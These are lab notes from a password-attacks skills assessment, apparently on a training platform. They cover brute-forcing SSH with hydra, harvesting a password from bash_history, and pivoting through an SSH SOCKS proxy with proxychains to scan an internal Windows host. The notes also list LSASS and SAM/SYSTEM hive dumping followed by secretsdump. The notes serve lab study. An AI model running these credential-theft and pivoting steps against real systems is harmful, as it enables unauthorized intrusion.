# Password Attacks — Skills Assessment

> **Target:** 10.129.234.116 | **OS:** Windows | **Difficulty:** Medium
> ⚠️ IP changes on restart — confirm current IP before starting.
> **Updated:** 2026-04-18 11:03 UTC+8

---

## Assessment Checklist

- [x] Foothold (initial access) — SSH brute force
- [x] Local enumeration — Linux system, dual NICs, no sudo
- [x] Credential discovered in bash_history — `hwilliam / dealer-screwed-gym1`
- [x] Internal network discovered — file01 at 172.16.119.11 (Windows)
- [ ] Pivot to file01 and scan
- [ ] Access file01 with discovered credentials
- [ ] Privilege escalation on file01
- [ ] Flag(s)

---

## 1. Recon

### Target Information
- **Hostname:** DMZ01
- **OS:** Linux Ubuntu 5.4.0-216-generic
- **Architecture:** x86_64

### Network Interfaces
| Interface | IP Address | Network | Notes |
|-----------|------------|---------|-------|
| ens160 | 10.129.234.116/16 | 10.129.0.0/16 | External/VPN facing |
| ens192 | 172.16.119.13/24 | 172.16.119.0/24 | Internal network |
| lo | 127.0.0.1 | loopback | |

### Users on System
- **root** (uid=0) — target for privilege escalation
- **lab_adm** (uid=1000) — potential lateral movement target
- **jbetty** (uid=1001) — current user, no sudo rights

### Initial Access — SSH Brute Force

**Victim:** Betty Jayde (Nexura LLC)

```bash
# Generate usernames from name
echo "Betty Jayde" | ./username-anarchy -i /dev/stdin > usernames.txt

# Brute force SSH (use single quotes for special chars: !$@#)
hydra -L usernames.txt -p 'Texas123!@#' ssh://10.129.234.116 -t 4
```

**Result:** `jbetty / Texas123!@#`

**Connect:**
```bash
ssh jbetty@10.129.234.116
# Password: Texas123!@#
```

### Enumeration Summary
```bash
id
# uid=1001(jbetty) gid=1001(jbetty) groups=1001(jbetty)

sudo -l
# Sorry, user jbetty may not run sudo on DMZ01.

echo $SHELL
# /bin/bash
```

**Key Finding:** DMZ01 has dual network interfaces — foothold on 10.129.x.x with access to internal 172.16.119.0/24 network. Pivoting required to reach internal targets.

---

## 2. Local Enumeration

### Enumeration Summary
- **Kernel:** Linux 5.4.0-216-generic (Ubuntu)
- **SUDO:** No sudo access for jbetty
- **SUID binaries:** Standard system binaries only (no custom SUID)
- **Cron jobs:** Standard Ubuntu crons (e2scrub_all, popularity-contest) — not exploitable

### Key Finding: Credential in Bash History
```bash
cat /home/jbetty/.bash_history | grep sshpass
# sshpass -p "dealer-screwed-gym1" ssh hwilliam@file01
```

**Discovered Credentials:**
| Field | Value |
|-------|-------|
| Username | `hwilliam` |
| Password | `dealer-screwed-gym1` |
| Target Host | `file01` (internal, likely 172.16.119.x) |

### Pivoting Strategy
DMZ01 has dual NICs with access to internal network `172.16.119.0/24`. The `file01` host is likely in this range.

**Next Steps:**
1. Scan internal network to locate file01
2. Use discovered credentials to SSH into file01
3. Look for privilege escalation or flags on file01

---

## 3. Pivoting to Internal Network

### Internal Network Discovery
**Ping sweep from DMZ01:**
```bash
for i in $(seq 1 254); do ping -c1 -W1 172.16.119.$i & done 2>/dev/null | grep "bytes from"
```

**Results:**
| Host | IP | TTL | OS |
|------|-----|-----|-----|
| DMZ01 (self) | 172.16.119.13 | 64 | Linux |
| **file01** | **172.16.119.11** | 128 | **Windows** |

TTL 128 indicates Windows operating system.

### Pivot Setup
Since DMZ01 has no nmap, we route traffic through it using SSH SOCKS proxy.

**Step 1 — Create SOCKS tunnel (on attack host):**
```bash
ssh -D 9050 jbetty@10.129.234.116
# Password: Texas123!@#
```

**Step 2 — Configure proxychains (on attack host):**
```bash
sudo vim /etc/proxychains.conf
# Add under [ProxyList]: socks4 127.0.0.1 9050
```

**Step 3 — Scan internal target:**
```bash
sudo proxychains -q nmap -sT -Pn 172.16.119.11 --open
```

**Step 4 — Access file01 with discovered credentials:**
```bash
proxychains ssh hwilliam@172.16.119.11
# Password: dealer-screwed-gym1
```

---

## 4. Post-Exploitation

### Techniques

```bash
# LSASS dump
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full

# SAM/SYSTEM dump
reg.exe save hklm\sam C:\sam.save
reg.exe save hklm\system C:\system.save
reg.exe save hklm\security C:\security.save

# Crack with secretsdump.py
python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL
```

---

## 4. Flags

| Flag | Location | Method |
|------|----------|--------|
| user.txt | | |
| root.txt | | |

---

## Lessons Learned

